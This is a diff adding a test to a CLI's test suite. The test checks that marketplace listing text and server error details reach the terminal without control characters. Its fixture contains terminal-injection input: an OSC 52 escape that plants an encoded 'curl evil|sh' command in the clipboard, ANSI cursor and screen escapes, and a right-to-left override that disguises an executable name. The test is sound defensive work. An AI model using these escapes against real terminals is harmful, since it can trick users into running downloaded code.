@@ -573,6 +573,37 @@ describe("commands", () => {
     expect(wrong.err).toContain("does not match");
     expect(wrong.server.calls.map((c) => c.operationId)).toEqual(["previewMarketplaceInstall"]);
   });
+  it("server-controlled text is shown inert: a publisher's listing cannot drive the terminal (ANSI/OSC escapes, bidi overrides)", async () => {
+    const evil = "Helpful\x1b]52;c;Y3VybCBldmlsfHNo\x07 \x1b[2K\x1b[1Afree \u202Egnp.exe\u200B\x9b31m";
+    const l = {
+      namespace: "acme",
+      name: "agent-one",
+      title: evil,
+      summary: evil,
+      categories: ["support"],
+      latest: { version: "1.0.0", content_hash: "a".repeat(64), risk_level: "minimal", max_severity: "info" },
+      versions: ["1.0.0"],
+    };
+    const show = await axis(["marketplace", "show", "acme/agent-one"], {
+      mock: { overrides: { getMarketplaceListing: () => json(l) } },
+    });
+    const search = await axis(["marketplace", "search"], {
+      mock: { overrides: { listMarketplaceListings: () => json({ items: [l] }) } },
+    });
+    for (const r of [show, search]) {
+      expect(r.code).toBe(0);
+      // no control character other than the newline that separates rows, no bidi override, no zero-width character
+      // eslint-disable-next-line no-control-regex
+      expect(r.out.replace(/\n/g, "")).not.toMatch(/[\u0000-\u001f\u007f-\u009f\u200b-\u200f\u202a-\u202e\u2066-\u2069\ufeff]/);
+      expect(r.out).toContain("Helpful");
+    }
+    // an error detail written by the server is inert as well
+    const bad = await axis(["run", "get", RUN], {
+      mock: { overrides: { getRun: () => problem(404, "not_found", { detail: "gone\x1b[2J\x1b]0;pwned\x07" }) } },
+    });
+    // eslint-disable-next-line no-control-regex
+    expect(bad.err).not.toMatch(/[\u0000-\u0008\u000b-\u001f\u007f-\u009f]/);
+  });
   it("registry keygen/sign/publish: the private key stays in its 0600 file, never in output", async () => {
     const dir = tmp();
     const keyFile = join(dir, "pub.pem");
